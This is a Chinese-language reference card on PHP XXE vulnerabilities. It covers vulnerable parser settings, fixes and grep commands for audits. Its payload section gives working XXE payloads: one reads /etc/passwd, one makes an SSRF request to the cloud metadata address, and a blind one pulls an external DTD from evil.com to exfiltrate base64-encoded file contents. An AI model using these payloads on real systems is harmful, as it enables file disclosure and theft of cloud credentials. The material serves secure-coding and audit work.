# PHP XXE

## 确认条件

XML解析器处理用户可控XML且允许加载外部实体。

## 检测

```php
// SimpleXML
$xml = simplexml_load_string($_POST['xml'], null, LIBXML_NOENT);
// LIBXML_NOENT 显式开启实体替换 → 漏洞成立

// DOMDocument
$dom = new DOMDocument();
$dom->loadXML($_POST['xml'], LIBXML_NOENT | LIBXML_DTDLOAD);
// LIBXML_DTDLOAD + LIBXML_NOENT → 加载 DTD → 漏洞成立

// PHP < 8.0 默认行为
$xml = simplexml_load_string($_POST['xml']);
// PHP 8.0 前 libxml2 默认配置 → 可能允许外部实体
```

## 修复

```php
// PHP 8.0+: libxml2 默认禁用外部实体
$xml = simplexml_load_string($_POST['xml']);

// 显式禁用
libxml_disable_entity_loader(true);  // PHP < 8.0
$xml = simplexml_load_string($input);

// DOMDocument 安全配置
$dom = new DOMDocument();
$dom->loadXML($input, LIBXML_NONET);  // 禁止网络访问
```

## 利用Payload

```xml
<!-- 文件读取 -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- SSRF -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]>
<root>&xxe;</root>

<!-- 盲XXE (OOB) -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">
  %dtd;
]>
```

## 检测命令

```bash
grep -rn "simplexml_load_string\|DOMDocument" --include="*.php"
grep -rn "LIBXML_NOENT\|LIBXML_DTDLOAD" --include="*.php"
grep -rn "libxml_disable_entity_loader" --include="*.php"
```
